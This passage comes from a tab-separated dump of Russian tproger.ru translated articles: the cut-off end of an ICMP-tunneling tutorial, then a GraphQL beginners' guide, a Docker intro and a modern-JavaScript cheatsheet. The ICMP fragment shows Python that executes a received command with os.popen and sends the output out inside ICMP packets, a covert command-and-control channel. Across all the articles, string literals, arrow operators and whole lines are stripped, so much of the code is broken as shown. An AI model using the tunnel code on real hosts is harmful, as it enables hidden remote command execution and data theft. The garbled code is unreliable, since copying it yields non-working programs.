сохраняем результат\n        res = os.popen(var).read()\n        # создаём ICMP-пакет с результатом в качестве полезной нагрузки\n        send(IP(dst=, id=0x0001, seq=0x1)/res)\nif __name__ == :\n    main()Использование выглядит как-то так:И никогда не будет лишним посмотреть, что на самом деле происходит, с помощью Wireshark:C2 Никита Прияцелюк, последний центурион Wi-Fi, Безопасность, Сетевые протоколы	https://tproger.ru/translations/icmp-tunneling/	107
ea820c14-32eb-11e9-9b69-28c2dd5a952f	Учитесь общаться, а не только кодить  в будущем социальные навыки могут вытеснить технические	Для мотивации; Образование	Образование должно подготовить человека к будущему. Обычно это предполагает изучение определённых фактов и навыков, к примеру дат тех или иных исторических событий и деление столбиком.В то же время задачи, с которыми столкнутся люди в будущем, будут значительно отличаться от тех, что решает наше поколение. К тому времени, когда нынешние школьники закончат вузы, значительная часть полученных ими знаний уже будет неактуальна. Проведённое Оксфордским университетом исследование показало, что 47 % существующих в настоящее время профессий исчезнут в ближайшие 20 лет.Через несколько десятилетий многое из того, что мы знаем о мире, утратит актуальность. Компьютеры перестанут быть цифровыми. Сам программный код исчезнетt Teach Your Kid to Code. Teach Them to CommunicateСергей Штукатуров Для мотивации, Образование	https://tproger.ru/translations/learn-to-communicate/	107
eaa1fede-32eb-11e9-9b69-28c2dd5a952f	Руководство по GraphQL для начинающих	API; Для начинающих; Обучение программированию	Аббревиатура API означает: {\n    ,\n    \n}Создайте на сервере папкуschema.graphql. В этот файл добавьте код:type Query {\n  hello: String\n}В этом файле будет находиться вся схема GraphQL.Создайте второй файл в той же папке, назовите его\n\nconst resolvers = {\n  Query: {\n    hello: () =\n  }\n};\n\nexport default resolvers;В этом файле будут размещены инструкции по выполнению операций GraphQL.Создайте третий файл,db.js, содержащий код:export let users = [\n  { id: 1, name: , age: 22 },\n  { id: 2, name: , age: 23 }\n];Для обучения работе с GraphQL нет нужды использовать настоящие данные. Этот файл нужен для симуляции обращений к базе данных.После выполнения операций папка src должна выглядеть следующим образом:src\n  |--db.js\n  |--resolvers.js\n  |--schema.graphqlТеперь необходимо выполнить командуQuery следующим кодом:type User {\n  id: ID!\n  name: String!\n  email: String!\n  age: Int\n}Каждая запись типа User должна иметь идентификационный номер, поэтому поле id содержит данные соответствующего типа. ПоляQuery:type Query {\n  users: [User!]!\n}Запрос users будет возвращать массив из одной и более записей типа User. Поскольку в определении использованы восклицательные знаки, ответ на запрос не может быть пустым.Для получения конкретной записи User необходимо создать соответствующий запрос. В данном случает это будет запрос user в типе Query. Добавьте в код следующую строку:user(id: ID!): User!Теперь код должен выглядеть так:type Query {\n  users: [User!]!\n  user(id: ID!): User!\n}Как видите, в запросах GraphQL можно передавать аргументы. В данном случае для получения конкретной записи в запросе в качестве аргумента используется её поле id.Местонахождение данных, которые будут обрабатываться в соответствии с запросом, определяется в файле\n\nconst resolvers = {\n  Query: {\n    hello: () =\n  }\n};\n\nexport default resolvers;Затем замените функцию\n\nconst resolvers = {\n  Query: {\n    user: (parent, { id }, context, info) = {\n      return users.find(user =\n    },\n    users: (parent, args, context, info) = {\n      return users;\n    }\n  }\n};\n\nexport default resolvers;В каждом резолвере запроса есть четыре аргумента. В запросе userdb.js:query {\n  users {\n    id\n    name\n    email\n    age\n  }\n}Получить первую запись из базы можно с помощью этого кода:query {\n  user(id: 1) {\n    id\n    name\n    email\n    age\n  }\n}ИзмененияВ GraphQL измененияmutation:type Mutation {\n  createUser(id: ID!, name: String!, email: String!, age: Int): User!\n  updateUser(id: ID!, name: String, email: String, age: Int): User!\n  deleteUser(id: ID!): User!\n}В данном случае указано три различных изменения:createUser: необходимо передать значение полей id, name, email и age. Функция возвращает запись типа User.updateUser: необходимо передать значение поля id, новое значение поля name, email или age. Функция возвращает запись типа User.createUser: необходимо передать значение поля id. Функция возвращает запись типа User.Теперь откройте файл resolvers.jsсоздайте новый объект mutation:Mutation: {\n    createUser: (parent, { id, name, email, age }, context, info) = {\n      const newUser = { id, name, email, age };\n\n      users.push(newUser);\n\n      return newUser;\n    },\n    updateUser: (parent, { id, name, email, age }, context, info) = {\n      let newUser = users.find(user =\n\n      newUser.name = name;\n      newUser.email = email;\n      newUser.age = age;\n\n      return newUser;\n    },\n    deleteUser: (parent, { id }, context, info) = {\n      const userIndex = users.findIndex(user =\n\n      if (userIndex === -1) throw new Error(\n\n      const deletedUsers = users.splice(userIndex, 1);\n\n      return deletedUsers[0];\n    }\n  }\nПолный код файла\n\nconst resolvers = {\n  Query: {\n    user: (parent, { id }, context, info) = {\n      return users.find(user =\n    },\n    users: (parent, args, context, info) = {\n      return users;\n    }\n  },\n  Mutation: {\n    createUser: (parent, { id, name, email, age }, context, info) = {\n      const newUser = { id, name, email, age };\n\n      users.push(newUser);\n\n      return newUser;\n    },\n    updateUser: (parent, { id, name, email, age }, context, info) = {\n      let newUser = users.find(user =\n\n      newUser.name = name;\n      newUser.email = email;\n      newUser.age = age;\n\n      return newUser;\n    },\n    deleteUser: (parent, { id }, context, info) = {\n      const userIndex = users.findIndex(user =\n\n      if (userIndex === -1) throw new Error(\n\n      const deletedUsers = users.splice(userIndex, 1);\n\n      return deletedUsers[0];\n    }\n  }\n};\n\nexport default resolvers;Сделайте запрос кlocalhost:4000:mutation {\n  createUser(id: 3, name: , age: 21) {\n    id\n    name\n    email\n    age\n  }\n}Он должен вернуть новую запись типаUser. Опробуйте также остальные функции изменения.ПодпискиКак упоминалось ранее, с помощью подписок поддерживается постоянная связь между клиентами и сервером. Базовая подписка выглядит следующим образом:subscription {\n  users {\n    id\n    name\n    email\n    age\n  }\n}Несмотря на то что этот код выглядит похожим на запрос, работает он несколько иначе. При обновлении данных сервер выполняет определённый в подписке запрос GraphQL и рассылает обновлённые данные клиентам. Более подробно о работе с подписками можно почитать в этом материале.ЗаключениеСтандарт GarphQL набирает популярность. В рамках опросаs Guide to GraphQLСергей Штукатуров API, Для начинающих, Обучение программированию	https://tproger.ru/translations/graphql-beginners-guide/	107
eac00a46-32eb-11e9-9b69-28c2dd5a952f	Основные концепции Docker на простых примерах из жизни	Docker; Для начинающих	Контейнеры чрезвычайно полезны с точки зрения безопасности, воспроизводимости и масштабируемости при разработке ПО и обработке данных. Их использование облегчает жизнь многим разработчикам.Для разработки, упаковки и запуска приложений в контейнере необходимо специальное ПО. Docker Сергей Ринг Docker, Для начинающих	https://tproger.ru/translations/docker-concepts/	107
eadd9732-32eb-11e9-9b69-28c2dd5a952f	Шпаргалка по современному JavaScript	JavaScript; Веб-разработка	В данном материале собраны основные концепции и принципы современного JavaScript, которые помогут быстро найти и вспомнить необходимую фичу.СодержаниеОбъявление переменных var, const, letСтрелочные функцииПараметры функции по умолчаниюДеструктурирование объектов и массивовМетоды массивов map/filter/reduceОператор spread(через const.Область переменных функции обозначает рамки их использования в коде.Оператор var. Объявленные с его помощью переменные работают в пределах функции и не доступны вне её.function myFunction() {\n  var myVar = \n  console.log(myVar); //  - myVar доступна в пределах функции\n}\nconsole.log(myVar); // выведет ошибку ReferenceError, myVar не доступна вне функцииДругой пример, демонстрирующий рамки области переменных:function myFunction() {\n  var myVar = \n  if (true) {\n    var myVar = \n    console.log(myVar); // \n    // myVar находится в пределах функции, мы изменили значение myVar с \n  }\n  console.log(myVar); // команды блока if влияют на значение \n}\nconsole.log(myVar); // выведет ошибку ReferenceError, myVar не доступна вне функцииПеременные при выполнении оператора присваивания перемещаются в начало, что называется . Часть кода:console.log(myVar) // не определена, поэтому ошибки нет\nvar myVar = 2;при выполнении понимается как:var myVar;\nconsole.log(myVar) // не определена, поэтому ошибки нет\nmyVar = 2;Оператор let. Переменные, объявленные с его помощью, имеют блочную область видимости. Кроме того, они не доступны, пока не присвоены и пока их значение нельзя изменить в той же области. На примере, приведённом выше:function myFunction() {\n  let myVar = \n  if (true) {\n    let myVar = \n    console.log(myVar); // \n    // myVar имеет блочную область видимости, поэтому мы задали новое значение\n    // оно не доступно вне области и не зависит от предыдущего значения myVar\n  }\n  console.log(myVar); // команды блока if НЕ влияют на \n}\nconsole.log(myVar); // выведет ReferenceError, myVar не доступна вне функцииВот как это работает для не доступных до присвоения переменных, объявленных операторамиlet и const:console.log(myVar) // выведет ReferenceError\nlet myVar = 2;Переменные, объявленные с помощью var, доступны до присвоения. При использовании let и const \nlet myVar = 3; // выведет SyntaxErrorОператор const. Переменные, объявленные с его помощью, также имеют блочную область видимости и не доступны до присвоения. Кроме того, их нельзя объявить или заново присвоить в той же области:const myVar = \nmyVar = \nconst myVar = нельзяОднако тонкость заключается в том, что вы можете изменить значение объявленной оператором const переменной для объектов:const person = {\n  name: 'Nick'\n};\nperson.name = 'John' // будет работать, поскольку значение изменили, а не присвоили заново\nconsole.log(person.name) // \nperson = \nperson.push('John'); // будет работать, поскольку переменную person изменили, а не присвоили заново\nconsole.log(person[0]) // \nperson = [] // выведет ошибку, поскольку повторное присвоение не доступно для переменных, объявленных с помощью constСтрелочные функцииСтрелочные функции ввели в обновлении ES6 как альтернативный способ объявления и использования функций.Краткость. Стрелочные функции короче традиционных, и каждый случай требует отдельного рассмотрения.Явная/неявная функция return. Явная функция предполагает использование return в коде:function double(x) {\n    return x * 2; // функция возвращает x * 2 с использованием слова return в коде\n  }Традиционный код отличается наличием ключевого слова:  const double = (x) = {\n    return x * 2; // явная функция\n  }Поскольку перед return нет команд, стрелочные функции позволяют избежать дополнительной строки:const double = (x) =, age: 24 })\nconsole.log(getPerson()) // объект { // скобки присутствуют, всё работает\n    const x = 2;\n    return x;\n  }  = { // скобки отсутствуют, код не будет работать\n    const x = 2;\n    return x;\n  }Привязка ключевого слова this к окружению. Чтобы понять тонкости, необходимо знать о поведении this в JavaScript. Для доступа к переменной в функции внутри функции, например, пришлось бы использовать that = thismyFunc:function myFunc() {\n  this.myVar = 0;\n  var that = this; // that = this\n  setTimeout(\n    function() { // новое this создано из области\n      that.myVar++;\n      console.log(that.myVar) // 1\n\n      console.log(this.myVar) // не определено см. объявление функции выше\n    },\n    0\n  );\n}Теперь в том же коде используем стрелочные функции:function myFunc() {\n  this.myVar = 0;\n  setTimeout(\n    () = { // this из окружения, предполагает значение myFunc\n      this.myVar++;\n      console.log(this.myVar) // 1\n    },\n    0\n  );\n}Параметры функции по умолчаниюС выходом версииES2015 значение по умолчанию для параметра функции задаётся при помощи следующего синтаксиса:function myFunc(x = 10) {\n  return x;\n}\nconsole.log(myFunc()) // 10 не задано значение, поэтому значение x по умолчанию присвоено x в функции myFunc\nconsole.log(myFunc(5)) // 5 значение задано, поэтому x=5 в функции myFunc\n\nconsole.log(myFunc(undefined)) // 10 задано значение undefined, поэтому по умолчанию равно x\nconsole.log(myFunc(null)) // null this.props из React-проектов.Объект. Рассмотрим для всех примеров объект:const person = {\n  firstName: ,\n  lastName: ,\n  age: 35,\n  sex: \n}Без деструктурирования:const first = person.firstName;\nconst age = person.age;\nconst city = person.city ||  // так выглядит деструктурирование одной строкой\n\nconsole.log(age) // 35 создана переменная age, которая равна person.age\nconsole.log(first) // создана переменная first, значение которой соответствует person.firstName\nconsole.log(firstName) // ReferenceError person.firstName существует, но новая переменная называется first\nconsole.log(city) // Paris .Параметры функции. Деструктурирование применяется для извлечения параметров объектов в функции.\nБез деструктурирования:function joinFirstLastName(person) {\n  const firstName = person.firstName;\n  const lastName = person.lastName;\n  return firstName + '-' + lastName;\n}\n\njoinFirstLastName(person); // Nick-AndersonИзвлекая параметр person, получим компактную функцию:function joinFirstLastName({ firstName, lastName }) { // Мы создаём переменные firstName и lastName, деструктурируя параметр person\n  return firstName + '-' + lastName;\n}\n\njoinFirstLastName(person); // Nick-AndersonСо стрелочными функциями код становится существенно меньше:const joinFirstLastName = ({ firstName, lastName }) =\n\njoinFirstLastName(person); // Nick-AndersonМассив. Рассмотрим массив:const myArray = [\nconst y = myArray[1];С деструктурированием:const [x, y] = myArray; // вот оно!\n\nconsole.log(x) // \nconsole.log(y) // for и forEach в большинстве ситуаций. Попробуйте вместо for использовать совокупность map, filter и reduce. В первый раз будет сложно, потому что придётся научиться мыслить иначе, но дальше привыкнете. Посчитаем для примера сумму оценок студентов с результатом 10 и выше, используя три этих метода:const students = [\n  { name: , grade: 10 },\n  { name: , grade: 15 },\n  { name: , grade: 19 },\n  { name: , grade: 9 },\n];\n\nconst aboveTenSum = students\n  .map(student = student.grade) // сравниваем массив студентов с массивом их оценок\n  .filter(grade == 10) // отбираем оценки выше 10\n  .reduce((prev, next) = // суммируем каждую оценку выше 10\n\nconsole.log(aboveTenSum) // 44 -- 10 (Nick) + 15 (John) + 19 (Julia), Nathalie игнорируется,Array.prototype.map().const doubledNumbers = numbers.map(function(n) {\n  return n * 2;\n});\nconsole.log(doubledNumbers); // [0, 2, 4, 6, 8, 10, 12]Что мы тут сделали? .map выполняет итерацию каждого элемента массива numbers и перемещает их в функцию. Цель функции \nconst doubledNumbers = numbers.map(doubleN);\nconsole.log(doubledNumbers); // [0, 2, 4, 6, 8, 10, 12]Метод часто используется со стрелочными функциями:const doubledNumbers = numbers.map(n =\nconsole.log(doubledNumbers); // [0, 2, 4, 6, 8, 10, 12]Используем numbers.map(doubleN) и получаем[doubleN(0), doubleN(1), doubleN(2), doubleN(3), doubleN(4), doubleN(5), doubleN(6)], что равно [0, 2, 4, 6, 8, 10, 12].В случае если возвращать массив нет необходимости и нужен цикл с побочными эффектами, используйте for/forEach.Array.prototype.filter().const evenNumbers = numbers.filter(function(n) {\n  return n % 2 === 0; // верно, если значение n равно значению, и ложно, если n не равно значению\n});\nconsole.log(evenNumbers); // [0, 2, 4, 6]Метод также часто используется со стрелочными функциями:const evenNumbers = numbers.filter(n =\nconsole.log(evenNumbers); // [0, 2, 4, 6].filter осуществляет итерацию каждого элемента массива numbers и добавляет их в функцию. сократить переменные до одной после итерации.const sum = numbers.reduce(\n  function(acc, n) {\n    return acc + n;\n  },\n  0 // значение накопительной переменной на первой ступени итерации\n);\n\nconsole.log(sum) // 21Метод также часто используется со стрелочными функциями:const sum = numbers.reduce((acc, n) =\nconsole.log(sum) // 21.reduce применяется к массиву и использует функцию как первый параметр. Однако в данном случае мы сталкиваемся с исключениями:функция\nn = 0, первый элемент массива number.\nФункция возвращает acc + n \nn = 1, второй элемент массива number.\nФункция возвращает acc + n \nn = 2, третий элемент массива number.\nФункция возвращает acc + n \nn = 3, четвёртый элемент массива number.\nФункция возвращает acc + n  6(…действия повторяются до последнего шага)\nacc = 15, поскольку это значение функция вернула на предыдущей ступени\nn = 6, последний элемент массива number.\nНа последнем шаге функция возвращает acc + n \nconst arr2 = [arr1, \nconst arr2 = [...arr1, относится к функциям, равным массиву переданных функции аргументов.function myFunc() {\n  for (var i = 0; i  i++) {\n    console.log(arguments[i]);\n  }\n}\n\nmyFunc(\n// \n// \n// 10\n// 12\n// 6Давайте предположим, что нам нужно добавить студента с его оценками и посчитать средний балл. Не лучше ли сделать два параметра двумя разными значениями, а затем собрать массив из полученных данных для итерации? В этом нам и поможет оставшийся параметр.function createStudent(firstName, lastName, ...grades) {\n  // firstName = \n  // lastName = \n  // [10, 12, 6]:  собирает оставшиеся параметры и создаёт содержащее их значение массива grades\n\n  const avgGrade = grades.reduce((acc, curr) = // высчитывает средний балл из всех\n\n  return {\n    firstName: firstName,\n    lastName: lastName,\n    grades: grades,\n    avgGrade: avgGrade\n  }\n}\n\nconst student = createStudent(\nconsole.log(student);\n// {\n//   firstName: ,\n//   lastName: ,\n//   grades: [10, 12, 6],\n//   avgGrade: 9,33\n// }Расширение свойств объекта.const myObj = { x: 1, y: 2, a: 3, b: 4 };\nconst { x, y, ...z } = myObj; // деструктурируем объект\nconsole.log(x); // 1\nconsole.log(y); // 2\nconsole.log(z); // { a: 3, b: 4 }\n\n// z оставшаяся часть деструктурированного объекта myObj после вычитания свойств x и y\n\nconst n = { x, y, ...z };\nconsole.log(n); // { x: 1, y: 2, a: 3, b: 4 }\n\n// свойства объекта z распространяются на nСокращение свойств объектаЗададим переменную для свойств объекта.\nconst myObj = { x };\nconsole.log(myObj.x) // 10Если вы объявляли объектный литерал в версиях до ES2015 или хотели использовать переменную в качестве значения свойств объекта, то пришлось бы писать:const x = 10;\nconst y = 20;\n\nconst myObj = {\n  x: x, // объявление значения переменной x для myObj.x\n  y: y // объявление значения переменной y для myObj.y\n};\n\nconsole.log(myObj.x) // 10\nconsole.log(myObj.y) // 20Слишком много повторений, не так ли? Поэтому с выходом ES2015 при совпадении переменной с названием свойства, достаточно такого кода:const x = 10;\nconst y = 20;\n\nconst myObj = {\n  x,\n  y\n};\n\nconsole.log(myObj.x) // 10\nconsole.log(myObj.y) // 20Объекты  {\n  $.get()\n    .done(posts = res(posts))\n    .fail(err =\n});\n\nfetchingPosts\n  .then(posts = console.log(posts))\n  .catch(err =отклонён.Представим, что нам нужно создать Ajax-запрос до ресурса X. Используем для этого метод jQuery.get():const xFetcherPromise = new Promise( // создаём промис, используя ключевое слово new и записываем его в переменную\n  function(resolve, reject) { // конструктор промиса использует аргумент функции с другими аргументами resolve и reject\n    $.get() // посылаем AJAX-запрос\n      .done(function(X) { // как только запрос завершён\n        resolve(X); // промис использует resolve с переменной X в качестве аргумента\n      })\n      .fail(function(error) { // если запрос отклонён\n        reject(error); // промис использует reject с error в качестве аргумента\n      });\n  }\n)Объект Promise выполняет функцию executorс аргументами resolve и reject. Эти аргументы выполняются по завершении операции как и функции, которые переводят промис из состояния ожидания в состояние выполнения или отклонения. Функция executor выполняется сразу после создания промиса в статусе ожидания. Как только аргументами функции становятся resolve или reject, промис использует необходимые методы.Используем методы промиса, чтобы получить его выполнение или ошибку:xFetcherPromise\n  .then(function(X) {\n    console.log(X);\n  })\n  .catch(function(err) {\n    console.log(err)\n  })В случае сдержанного промиса выполняется resolve и функция с методом\n`Hello ${name}, the following expression is equal to four : ${2+2}`;\n\n// Hello Nick, the following expression is equal to four: 4Теговые шаблоныЯвляются расширенной формой шаблонных литералов и позволяют разбирать их с помощью функции. При вызове функции первый аргумент содержит массив строковых значений между интерполированными значениями. Чтобы уместить их все, используйте оператор spread (...). Библиотека styled-components написана с применением теговых шаблонов.Ниже приведён небольшой пример их работы:function highlight(strings, ...values) {\n  const interpolation = strings.reduce((prev, current) = {\n    return prev + current + (values.length ? \n  }, \n\n  return interpolation;\n}\n\nconst condiment = \nconst meal = \n\nhighlight`I like ${condiment} on ${meal}.`;\n// Другой интересный пример:function comma(strings, ...values) {\n  return strings.reduce((prev, next) = {\n    let value = values.shift() || [];\n    value = value.join(\n    return prev + next + value;\n  }, \n}\n\nconst snacks = ['apples', 'bananas', 'cherries'];\ncomma`I like ${snacks} to snack on.`;\n// Инструкции импорта и экспортаЭкспорт функций/объектов из модулей ES6 и импорт значений из них.Именованные импорт/экспорт используют для нескольких величин (ими могут быть лишь объекты первого класса):// mathConstants.js\nexport const pi = 3.14;\nexport const exp = 2.7;\nexport const alpha = 0.35;\n\n// -------------\n\n// myFile.js\nimport { pi, exp } from './mathConstants.js'; // синтаксис именованного импорта схож с синтаксисом деструктурирования\nconsole.log(pi) // 3.14\nconsole.log(exp) // 2.7\n\n// -------------\n\n// mySecondFile.js\nimport * as constants from './mathConstants.js'; // подставляем экспортированные значения в переменную constants\nconsole.log(constants.pi) // 3.14\nconsole.log(constants.exp) // 2.7Несмотря на внешнюю схожесть именных импортов с деструктурированием, синтаксис отличается. Они не поддерживают значения по умолчанию или вложенное деструктурирование. Кроме того, можно использовать дополнительное имя, но синтаксис отличается от используемого при деструктурировании:import { foo as bar } from 'myFile.js'; // импортируем foo с новым именем переменной barИмпорт/экспорт по умолчанию.Для одного модуля доступен один экспорт по умолчанию. Экспорт может быть функцией, классом, объектом и т.д. Значение рассматривается как , поскольку так его проще импортировать:// coolNumber.js\nconst ultimateNumber = 42;\nexport default ultimateNumber;\n\n// ------------\n\n// myFile.js\nimport number from './coolNumber.js';\n// экспорт по умолчанию, независимо от названия, подставляется как значение переменной number\nconsole.log(number) // 42Экспорт функции:// sum.js\nexport default function sum(x, y) {\n  return x + y;\n}\n// -------------\n\n// myFile.js\nimport sum from './sum.js';\nconst result = sum(1, 2);\nconsole.log(result) // 3Ключевое слово thisПоведение этого ключевого слова в JavaScript отличается от других языков и зависит от вызова функции.function myFunc() {\n  ...\n}\n\n// после каждого выражения выводится аргумент this для функции myFunc\n\nmyFunc.call(первый аргумент функции .call для this\n\n// В нестрогом режиме\nmyFunc()\n\n// В строгом режиме\nmyFunc()var person = {\n  myFunc: function() { ... }\n}\n\nperson.myFunc.call(person, аргумент первого вызова функции для this\nperson.myFunc()\n\nvar myBoundFunc = person.myFunc.bind() // создаёт новую функцию, в которую мы подставляем hello в качестве значения переменной для this\nperson.myFunc() // объект person: привязка не влияет на начальный метод\nmyBoundFunc( смутит вас, если вы знакомы с классами в других языках программирования. Попробуйте посмотреть иначе: прочитайте о прототипах и их поведении в JavaScript. До ES6 синтаксис прототипов выглядел следующим образом:var Person = function(name, age) {\n  this.name = name;\n  this.age = age;\n}\nPerson.prototype.stringSentence = function() {\n  return \n}С синтаксисом классов в ES6:class Person {\n  constructor(name, age) {\n    this.name = name;\n    this.age = age;\n  }\n\n  stringSentence() {\n    return `Привет, я ${this.name} и мне ${this.age}`;\n  }\n}\n\nconst myPerson = new Person(\nconsole.log(myPerson.age) // 23\nconsole.log(myPerson.stringSentence()) // Привет, я Ману и мне 23Ключевые слова extends и superКлючевое слово extends используют для объявления классов или в выражениях класса для создания дочерних классов. Они получают свойства родительских классов, а также дают возможность добавить новые свойства и изменить заимствованные.Ключевое слово super вызывает функции родителя объекта, включая его конструктор. Его следует использовать:до ключевого слова this в конструкторе;с вызовомкак вызов дочернего класса super.X() для метода X родительского класса.class Polygon {\n  constructor(height, width) {\n    this.name = 'Polygon';\n    this.height = height;\n    this.width = width;\n  }\n\n  getHelloPhrase() {\n    return `Привет, я \n  }\n}\n\nclass Square extends Polygon {\n  constructor(length) {\n    // здесь вызван конструктор родительского класса со значением lengths\n    // использованным для значений width и height класса Polygon \n    super(length, length);\n    // в производных классах super() необходимо вызывать перед this\n    // иначе будет выведено сообщение об ошибке\n    this.name = 'Square';\n    this.length = length;\n  }\n\n  getCustomHelloPhrase() {\n    const polygonPhrase = super.getHelloPhrase(); // доступ к родительскому методу с синтаксисом super.X()\n    return `${polygonPhrase} with a length of ${this.length}`;\n  }\n\n  get area() {\n    return this.height * this.width;\n  }\n}\n\nconst mySquare = new Square(10);\nconsole.log(mySquare.area) // 100\nconsole.log(mySquare.getHelloPhrase()) // наследник класса Polygon с доступом к его методам\nconsole.log(mySquare.getCustomHelloPhrase()) // Привет, я Square с длиной 10Если бы мы попытались использовать this перед super() в классе Square, появилась бы ошибка ReferenceError:class Square extends Polygon {\n  constructor(length) {\n    this.height; // ReferenceError, ключевое слово super необходимо использовать раньше\n\n    // здесь вызван конструктор родительского класса со значением lengths\n    // использованным для значений width и height класса Polygon\n    super(length, length);\n\n    // в производных классах super() необходимо вызывать перед this\n    // иначе будет выведено сообщение об ошибке\n    this.name = 'Square';\n  }\n}Функция async и оператор awaitДля написания асинхронного кода в JavaScript появился синтаксис async/await. Цель нововведения упростить использование промисов и расширить рамки действий с ними. Для лучшего понимания этого синтаксиса, рекомендуем сначала ознакомиться с промисами. await может использоваться только внутри асинхронной функции.async function getGithubUser(username) { // ключевое слово async позволяет использовать await в функции, которая возвращает промис\n  const response = await fetch(`https://api.github.com/users/${username}`); // выполнение приостановлено до момента получения ответа от переданного промиса\n  return response.json();\n}\n\ngetGithubUser('mbeaudru')\n  .then(user = console.log(user)) // ответ пользователя, проходящего авторизацию: синтаксис await невозможно использовать, поскольку код не является асинхронной функцией\n  .catch(err =еёasync/await используется с промисами, но предполагают более императивный стиль кода. Оператор async определяет асинхронную функцию и всегда возвращает промис. Оператор await приостанавливает выполнение функции async, пока промис не выполнен или отклонён:async function myFunc() {\n  // допустимо использование await, поскольку функция асинхронная\n  return \n}\n\nmyFunc().then(msg =. В то же время при отсутствии возвращённого значения асинхронной функции, промис возвращается без значения по завершению выполнения асинхронной функции.Оператор await ожидает выполнения промиса.Функция fetch позволяет выполнить AJAX-запрос.Выберем пользователя GitHub с помощью промисов и функции fetch:function getGithubUser(username) {\n  return fetch(`https://api.github.com/users/${username}`).then(response =\n}\n\ngetGithubUser('mbeaudru')\n  .then(user = console.log(user))\n  .catch(err =async/await:async function getGithubUser(username) { // можем использовать промис с ключевым словом await\n  const response = await fetch(`https://api.github.com/users/${username}`); // выполнение останавливается, пока не выполнен промис\n  return response.json();\n}\n\ngetGithubUser('mbeaudru')\n  .then(user = console.log(user))\n  .catch(err =подходят в случае с цепочкой взаимосвязанных промисов. Например можно использовать их для получения токена, чтобы выделить пост блога в базе данных, а также информацию об авторе:async function fetchPostById(postId) {\n  const token = (await fetch('token_url')).json().token;\n  const post = (await fetch(`/posts/${postId}?token=${token}`)).json();\n  const author = (await fetch(`/users/${post.authorId}`)).json();\n\n  post.author = author;\n  return post;\n}\n\nfetchPostById('gzIrzeo64')\n  .then(post = console.log(post))\n  .catch(err =Обработка ошибок.Если не добавить блоки try/catch к выражению await, неперехваченные исключения будут отклонять промис, возвращённый асинхронной функцией. При этом неважно, находятся ли они внутри асинхронной функции или возникли во время await. Использование throw внутри асинхронной функции равноценно отклонённому промису.Вот так можно устранить ошибки при помощи промисов:function getUser() { // этот промис будет отклонён!\n  return new Promise((res, rej) =\n}\n\nfunction getAvatarByUsername(userId) {\n  return getUser(userId).then(user =\n}\n\nfunction getUserAvatar(username) {\n  return getAvatarByUsername(username).then(avatar =\n}\n\ngetUserAvatar('mbeaudru')\n  .then(res = console.log(res))\n  .catch(err =то же самое, но с async/await:async function getUser() { // возвращённый промис будет отклонён!\n  throw \n}\n\nasync function getAvatarByUsername(userId) = {\n  const user = await getUser(userId);\n  return user.avatar;\n}\n\nasync function getUserAvatar(username) {\n  var avatar = await getAvatarByUsername(username);\n  return { username, avatar };\n}\n\ngetUserAvatar('mbeaudru')\n  .then(res = console.log(res))\n  .catch(err = иначе возвращает true.!0 // true: 0 ложно, поэтому возвращает true\n!!0 // false: 0 ложно, поэтому !0 возвращает true, а !(!0) возвращает false\n!! // false: пустая строка ложна, поэтому NOT (NOT false) равно falseC конструктором объектов логических значений:new Boolean(0) // false\nnew Boolean(1) // trueВ трёхкомпонентном сравнении:myVar ? \nlet b = [1] == true // b истинно, [1].toString() возвращает \nlet c = [2] == true // c ложно, [2].toString() возвращает Анаморфизмы и катаморфизмыАнаморфизмы. Функции, с помощью которых объекты разворачиваются в более сложных структуры, содержащих объекты того же типа. Представим преобразование целого числа в ряд чисел:function downToOne(n) {\n  const list = [];\n\n  for (let i = n; i  --i) {\n    list.push(i);\n  }\n\n  return list;\n}\n\ndownToOne(5)\n  //=product преображает несколько чисел в одно:function product(list) {\n  let product = 1;\n\n  for (const n of list) {\n    product = product * n;\n  }\n\n  return product;\n}\n\nproduct(downToOne(5)) // 120ГенераторыЕщё один способ записать функциюс использованием генератора:function * downToOne(n) {\n  for (let i = n; i  --i) {\n    yield i;\n  }\n}\n\n[...downToOne(5)] // [ 5, 4, 3, 2, 1 ]Генераторы возвращают итерируемые объекты. Функция next() выполняется до ключевого слова yield, которое возвращает значение во внешний код. Либо до функции yield *, которая передаёт её другой функции-генератору. При возврате результата return функция-генератор считается завершённой. Дальнейшие вызовы функции next() не вернут новых значений.// пример yield *\nfunction * idMaker() {\n  var index = 0;\n  while (index  2) {\n    yield index;\n    index = index + 1;\n  }\n}\n\nvar gen = idMaker();\n\ngen.next().value; // 0\ngen.next().value; // 1\ngen.next().value; // неопределеноКлючевое слово yield * активирует следующую функцию-генератор во время итерации:// пример yield *\nfunction * genB(i) {\n  yield i + 1;\n  yield i + 2;\n  yield i + 3;\n}\n\nfunction * genA(i) {\n  yield i;\n  yield* genB(i);\n  yield i + 10;\n}\n\nvar gen = genA(10);\n\ngen.next().value; // 10\ngen.next().value; // 11\ngen.next().value; // 12\ngen.next().value; // 13\ngen.next().value; // 20// пример возврата функции-генератора\nfunction* yieldAndReturn() {\n  yield \n  return \n  yield \n}\n\nvar gen = yieldAndReturn()\ngen.next(); // { значение: , завершено: false }\ngen.next(); // { значение: , завершено: true }\ngen.next(); // { значение: не определено, завершено: true }Статические методыКлючевое слово static используется в классах для определения статичных методов. Статичные методы функции, принадлежащие объекту класса, но не доступные другим объектам того же класса.class Repo {\n  static getName() {\n    return \n  }\n}\n\n// нам не нужно создавать объект класса Repo\nconsole.log(Repo.getName()) // \n\nlet r = new Repo();\nconsole.log(r.getName()) // необработанная ошибка TypeError: r.getName неthis. Для нестатических методов этот подход не сработает:class Repo {\n  static getName() {\n    return \n  }\n\n  static modifyName(){\n    return this.getName() + '-added-this'\n  }\n}\n\nconsole.log(Repo.modifyName()) // название Repo modern-js-cheatsheet-added-thisВызов статического метода из нестатического метода производится двумя способами:с использованием названия класса. Мы используем имя класса и вызываем статичный метод как свойство, например ClassName.StaticMethodName:class Repo {\n  static getName() {\n    return \n  }\n\n  useName(){\n    return Repo.getName() + ' and it contains some really important stuff'\n  }\n}\n\n// для использования статических методов нам нужно создать класс\nlet r = new Repo()\nconsole.log(r.useName()) // название Repo данныеС помощью конструктора. Статические методы можно вызвать как свойства объектов конструктора:class Repo {\n  static getName() {\n    return \n  }\n\n  useName(){\n    // вызывает статический метод в качестве свойства конструктора\n    return this.constructor.getName() + ' and it contains some really important stuff'\n  }\n}\n\n// для использования нестатических методов нам нужно создать класс\nlet r = new Repo()\nconsole.log(r.useName()) // название Repo данныеЧитайте также:10 консольных команд для упрощения отладки JavaScript-кодаДетальный список инструментов для JavaScript Перевод статьи Modern JavaScript CheatsheetАртем Гаврилов  JavaScript, Веб-разработка	https://tproger.ru/translations/javascript-cheatsheet/	107
